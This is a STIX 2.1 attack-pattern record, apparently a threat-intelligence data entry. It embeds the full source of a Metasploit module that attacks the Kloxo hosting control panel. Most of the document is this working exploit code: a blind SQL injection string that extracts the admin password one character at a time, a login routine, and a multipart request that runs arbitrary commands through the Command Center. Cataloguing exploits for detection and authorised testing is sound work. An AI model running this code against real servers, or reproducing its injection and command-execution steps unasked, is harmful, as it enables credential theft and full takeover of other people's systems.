{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3182a2e5-54fb-49f6-8832-ea90e0d618b4",
    "created": "2024-08-14T17:00:40.544594Z",
    "modified": "2024-08-14T17:00:40.544598Z",
    "name": "Kloxo SQL Injection and Remote Code Execution",
    "description": " This module exploits an unauthenticated SQL injection vulnerability affecting Kloxo, as exploited in the wild on January 2014. The SQL injection issue can be abused in order to retrieve the Kloxo admin cleartext password from the database. With admin access to the web control panel, remote PHP code execution can be achieved by abusing the Command Center function. The module tries to find the first server in the tree view, unless the server information is provided, in which case it executes the payload there.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/kloxo_sqli.rb",
            "external_id": "kloxo_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "http://forum.lxcenter.org/index.php?t=msg&th=19215&goto=102646#patchdiscussion"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  Rank = ManualRanking\n  PASSWORD_PREFIX = '__lxen:'\n  BASE64_RANGE = Rex::Text::AlphaNumeric + '+/='\n\n  attr_accessor :password\n  attr_accessor :session\n  attr_accessor :server\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Kloxo SQL Injection and Remote Code Execution',\n      'Description'    => %q{\n        This module exploits an unauthenticated SQL injection vulnerability affecting Kloxo, as\n        exploited in the wild on January 2014. The SQL injection issue can be abused in order to\n        retrieve the Kloxo admin cleartext password from the database. With admin access to the\n        web control panel, remote PHP code execution can be achieved by abusing the Command Center\n        function. The module tries to find the first server in the tree view, unless the server\n        information is provided, in which case it executes the payload there.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown', # Discovery, exploit in the wild\n          'juan vazquez' # Metasploit Module\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://vpsboard.com/topic/3384-kloxo-installations-compromised/'], # kloxo exploited in the wild\n          ['URL', 'http://www.webhostingtalk.com/showthread.php?p=8996984'],           # kloxo exploited in the wild\n          ['URL', 'http://forum.lxcenter.org/index.php?t=msg&th=19215&goto=102646']    # patch discussion\n        ],\n      'Arch'           => ARCH_CMD,\n      'Platform'       => 'unix',\n      'Payload'        =>\n        {\n          'Space'       => 262144, # 256k\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl python gawk netcat'\n            }\n        },\n      'Targets'        =>\n        [\n          ['Kloxo / CentOS', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2014-01-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(7778),\n        OptString.new('TARGETURI', [true, 'The URI of the Kloxo Application', '/'])\n      ])\n\n    register_advanced_options(\n      [\n        OptString.new('SERVER_CLASS', [false, 'The server class']),\n        OptString.new('SERVER_NAME', [false, 'The server name'])\n      ])\n  end\n\n  def check\n    return Exploit::CheckCode::Safe unless webcommand_exists?\n    return Exploit::CheckCode::Safe if exploit_sqli(1, bad_char(0))\n    return Exploit::CheckCode::Safe unless pefix_found?\n\n    Exploit::CheckCode::Vulnerable\n  end\n\n  def exploit\n    fail_with(Failure::NotVulnerable, \"#{peer} - The SQLi cannot be exploited\") unless check == Exploit::CheckCode::Vulnerable\n\n    print_status(\"Recovering the admin password with SQLi...\")\n    loot = base64_password\n    fail_with(Failure::Unknown, \"#{peer} - Failed to exploit the SQLi...\") if loot.nil?\n    @password = Rex::Text.decode_base64(loot)\n    print_good(\"Password recovered: #{@password}\")\n\n    print_status(\"Logging into the Control Panel...\")\n    @session = send_login\n    fail_with(Failure::NoAccess, \"#{peer} - Login with admin/#{@password} failed...\") if @session.nil?\n\n    store_valid_credential(user: 'admin', private: @password)\n\n    print_status(\"Retrieving the server name...\")\n    @server = server_info\n    fail_with(Failure::NoAccess, \"#{peer} - Login with admin/#{Rex::Text.decode_base64(base64_password)} failed...\") if @server.nil?\n\n    print_status(\"Exploiting...\")\n    send_command(payload.encoded)\n  end\n\n  def send_login\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.to_s, 'htmllib', 'phplib', ''),\n      'vars_post' =>\n        {\n          'frm_clientname' => 'admin',\n          'frm_password'   => @password,\n          'login'          => 'Login'\n        }\n    )\n\n    if res && res.code == 302 && res.headers.include?('Set-Cookie')\n      return res.get_cookies\n    end\n\n    nil\n  end\n\n  def server_info\n\n    unless datastore['SERVER_CLASS'].blank? || datastore['SERVER_NAME'].blank?\n      return { :class => datastore['SERVER_CLASS'], :name => datastore['SERVER_NAME'] }\n    end\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.to_s, 'display.php'),\n      'cookie' => @session,\n      'vars_get' =>\n        {\n          'frm_action' => 'show'\n        }\n    })\n\n    if res && res.code == 200 && res.body.to_s =~ /<input type=hidden name=\"frm_subaction\" value =\"commandcenter\">/\n      return parse_display_info(res.body.to_s)\n    end\n\n    nil\n  end\n\n  def parse_display_info(html)\n    server_info = {}\n    pos = html.index(/<input type=hidden name=\"frm_subaction\" value =\"commandcenter\">/)\n\n    if html.index(/<input type=hidden name=\"frm_o_o\\[\\d+\\]\\[class\\]\" value =\"(.*)\">/, pos).nil?\n      return nil\n    else\n      server_info[:class] = $1\n    end\n\n    if html.index(/<input type=hidden name=\"frm_o_o\\[\\d+\\]\\[nname\\]\" value =\"(.*)\"> /, pos).nil?\n      return nil\n    else\n      server_info[:name] = $1\n    end\n\n    server_info\n  end\n\n  def send_command(command)\n    data = Rex::MIME::Message.new\n    data.add_part(@server[:class], nil, nil, 'form-data; name=\"frm_o_o[0][class]\"')\n    data.add_part(@server[:name], nil, nil, 'form-data; name=\"frm_o_o[0][nname]\"')\n    data.add_part(command, nil, nil, 'form-data; name=\"frm_pserver_c_ccenter_command\"')\n    data.add_part('', nil, nil, 'form-data; name=\"frm_pserver_c_ccenter_error\"')\n    data.add_part('updateform', nil, nil, 'form-data; name=\"frm_action\"')\n    data.add_part('commandcenter', nil, nil, 'form-data; name=\"frm_subaction\"')\n    data.add_part('Execute', nil, nil, 'form-data; name=\"frm_change\"')\n\n    post_data = data.to_s\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path.to_s, 'display.php'),\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'cookie' => @session,\n      'data'   => post_data\n    }, 1)\n  end\n\n  def webcommand_exists?\n    res = send_request_cgi('uri' => normalize_uri(target_uri.path.to_s, 'lbin', 'webcommand.php'))\n\n    if res && res.code == 200 && res.body.to_s =~ /__error_only_clients_and_auxiliary_allowed_to_login/\n      return true\n    end\n\n    false\n  end\n\n  def pefix_found?\n    i = 1\n    PASSWORD_PREFIX.each_char do |c|\n      return false unless exploit_sqli(i, c)\n      i = i + 1\n    end\n\n    true\n  end\n\n  def bad_char(pos)\n    Rex::Text.rand_text_alpha(1, PASSWORD_PREFIX[pos])\n  end\n\n  def ascii(char)\n    char.unpack('C')[0]\n  end\n\n  def base64_password\n    i = PASSWORD_PREFIX.length + 1\n    loot = ''\n\n    until exploit_sqli(i, \"\\x00\")\n      vprint_status(\"Brute forcing position #{i}\")\n      c = brute_force_char(i)\n      if c.nil?\n        return nil\n      else\n        loot << c\n      end\n      vprint_status(\"Found: #{loot}\")\n      i = i + 1\n    end\n\n    loot\n  end\n\n  def brute_force_char(pos)\n    BASE64_RANGE.each_char do |c|\n      return c if exploit_sqli(pos, c)\n    end\n\n    nil\n  end\n\n  def exploit_sqli(pos, char)\n    # $1$Tw5.g72.$/0X4oceEHjGOgJB/fqRww/ == crypt(123456)\n    sqli = \"al5i' \"\n    sqli << \"union select '$1$Tw5.g72.$/0X4oceEHjGOgJB/fqRww/' from client where \"\n    sqli << \"ascii(substring(( select realpass from client limit 1),#{pos},1))=#{ascii(char)}#\"\n\n    res = send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.to_s, 'lbin', 'webcommand.php'),\n      'vars_get' =>\n        {\n          'login-class'    => 'client',\n          'login-name'     => sqli,\n          'login-password' => '123456'\n        }\n    )\n\n    if res && res.code == 200 && res.body.blank?\n      return true\n    elsif res && res.code == 200 && res.body.to_s =~ /_error_login_error/\n      return false\n    end\n\n    vprint_warning(\"Unknown fingerprint while exploiting SQLi... be careful\")\n    false\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-28",
    "x_mitre_platforms": [
        "unix'"
    ]
}